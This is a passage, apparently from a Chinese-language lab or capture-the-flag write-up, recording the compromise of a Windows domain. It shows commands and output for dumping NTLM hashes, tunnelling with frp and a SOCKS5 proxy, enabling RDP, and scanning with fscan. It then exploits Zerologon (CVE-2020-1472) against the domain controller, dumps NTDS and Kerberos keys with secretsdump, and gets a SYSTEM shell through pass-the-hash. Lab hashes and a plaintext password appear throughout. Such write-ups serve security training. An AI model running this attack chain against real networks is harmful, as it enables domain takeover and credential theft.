报一对文字，就去远程桌面运行PsExec.exe点击界面，再运行

##### 上线成功

administrator

#### 信息收集

##### 获取hash

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

##### 获取密钥

```bash
* Username : Administrator
	 * Domain   : FILESERVER
	 * NTLM     : 42e2656ec24331269f82160ff5962387
	 * SHA1     : 202a4f252fa716b16cc934c114a2b4423add410d
```

> 域：fbi.gov

##### 命令

```bash
shell ipconfig
shell net user /domain
```

> 10.10.1.129
>
> 10.10.10.140
>
> 发生系统错误 5。
>
> 拒绝访问。

权限不足

#### 提权

##### 窃取模拟令牌

获取system权限

权限不足，失败

### 隧道搭建

#### frp

##### frps.toml

```bash
bindPort = 7000
auth.token = "123456kl"
```



```bash
frps.exe -c frps.tom
```



##### frpc.toml

```bash
serverAddr = "10.10.1.129"
serverPort = 7000
auth.token = "123456kl"

[[proxies]]
name = "rdp"
type = "tcp"
localIP = "10.10.10.140"
localPort = 3389
remotePort = 33890

[[proxies]]
name = "socks_1"
type = "tcp"
remotePort = 1080

[proxies.plugin]
type = "socks5"
```



```bash
frpc.exe -c frpc.toml
```

#### Proxifier代理链

windows

```bash
10.223.47.114
1080
socks5
```



```bash
10.10.1.129
1080
socks5
```



### 远程桌面

#### 开启远程桌面

```bash
netstat -ano > netstat.txt
ping 10.223.47.114 >ping.txt
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
```

##### 连接rdp

```bash
mstsc
10.10.1.129:33890
administrator / QWEasd123
```

成功

### 上传fscan

```bash
fscan -h 10.10.10.140/24 >fscan.txt
```



```bash
start infoscan
(icmp) Target 10.10.10.139    is alive
(icmp) Target 10.10.10.140    is alive
[*] Icmp alive hosts len is: 2
10.10.10.139:445 open
10.10.10.140:445 open
10.10.10.140:139 open
10.10.10.139:139 open
10.10.10.140:135 open
10.10.10.139:135 open
10.10.10.139:88 open
[*] alive ports len is: 7
start vulscan
[*] NetInfo 
[*]10.10.10.139
   [->]dc
   [->]10.10.10.139
[*] NetBios 10.10.10.139    [+] DC:FBI\DC                  
已完成 7/7
[*] 扫描结束,耗时: 7.2011797s

```

> 10.10.10.139
>
> [*] NetBios 10.10.10.139    [+] DC:FBI\DC  

域控DC：10.10.10.139

域名：FBI

## 4.域控-dc

### CVE-2020-1472

https://www.cnblogs.com/car7n/p/14789320.html

#### 检测

https://github.com/SecuraBV/CVE-2020-1472

https://github.com/mstxq17/cve-2020-1472

```bash
pip install -r requirements.txt
pip install impacket

python zerologon_tester.py dc 10.10.10.139
```



```bash
# python zerologon_tester.py dc 10.10.10.139
Performing authentication attempts...
===========================================================================================================================
Success! DC can be fully compromised by a Zerologon attack.
```

DC可以被Zerologon攻击完全破坏。

#### 清空域控密码

```bash
python CVE-2020-1472.py dc dc$ 10.10.10.139
```



```bash
# python CVE-2020-1472.py dc dc$ 10.10.10.139
[!] CVE-2020-1472 PoC by BlackArrow (Tarlogic)

Performing authentication attempts...
===============================
Success! DC can be fully compromised by a Zerologon attack. (attempt=31)

NetrServerPasswordSet2Response
ReturnAuthenticator:
    Credential:
        Data:                            b'\x01_\xe9\x17WL\xf7\x95'
    Timestamp:                       0
ErrorCode:                       0


[+] CVE-2020-1472 exploited
```

### impacket

#### 获取域控hash

使用impacket包

https://github.com/SecureAuthCorp/impacket

```bash
git clone https://github.com/fortra/impacket.git
cd impacket\examples
python secretsdump.py fbi/dc$@10.10.10.139 -hashes LMHASH:
```



```bash
# python secretsdump.py fbi/dc$@10.10.10.139 -hashes LMHASH:
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d19009f38e6b6720109b3fab3fa98090:::
fbi.gov\fileserver:1103:aad3b435b51404eeaad3b435b51404ee:a7670b92c536e6684b3620f2ddca7539:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
FILESERVER$:1104:aad3b435b51404eeaad3b435b51404ee:19d3b3a42280c6cb69adbbde4a9e207a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:a4b17d1c198d7e84afdc7879ad5b97f0da34d1f3e6fd0be1ecd4784a77918425
Administrator:aes128-cts-hmac-sha1-96:4dfa69ce7f92780bccfd24aecb7b20d9
Administrator:des-cbc-md5:2a7fcdc4bcbcadec
krbtgt:aes256-cts-hmac-sha1-96:4d4002368e4e7970bf5cf920bc8de2ed5d77dcf58ec649b02cdede0b3f0f2130
krbtgt:aes128-cts-hmac-sha1-96:f23ad681adf209b1f21c5554e828a85b
krbtgt:des-cbc-md5:4fa19183bc5be38f
fbi.gov\fileserver:aes256-cts-hmac-sha1-96:ced6482b3d945503d2d87fc38db7b6d72439e987c96f1a40427ee80dbd150fb1
fbi.gov\fileserver:aes128-cts-hmac-sha1-96:2f0ef12454dc325b520b8f38afd6d588
fbi.gov\fileserver:des-cbc-md5:98aea8f14a325e97
DC$:aes256-cts-hmac-sha1-96:61df1f3d887f788352e6a215260741fe50ab7c8304878a99218e644bbac683d5
DC$:aes128-cts-hmac-sha1-96:90307e2edc8642691d28ae3c98e05792
DC$:des-cbc-md5:68409d31b591a18c
FILESERVER$:aes256-cts-hmac-sha1-96:dda2807bd7b937422709842ef75a86ab6a34ec084330683f8a1b52c58c36fece
FILESERVER$:aes128-cts-hmac-sha1-96:1571a239c158ce021689d502c944cd75
FILESERVER$:des-cbc-md5:9e85da7cb3b51979
[*] Cleaning up...
```

> Administrator:500:aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3:::

#### 登录域控

哈希传递(administrator)

```bash
python smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:669a3273144a82b942377c1001ed03a3 administrator@10.10.10.139
```



```bash
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

system权限

### 恢复密码

登录域控后，恢复密钥

```bash
powershell Reset-ComputerMachinePassword
```

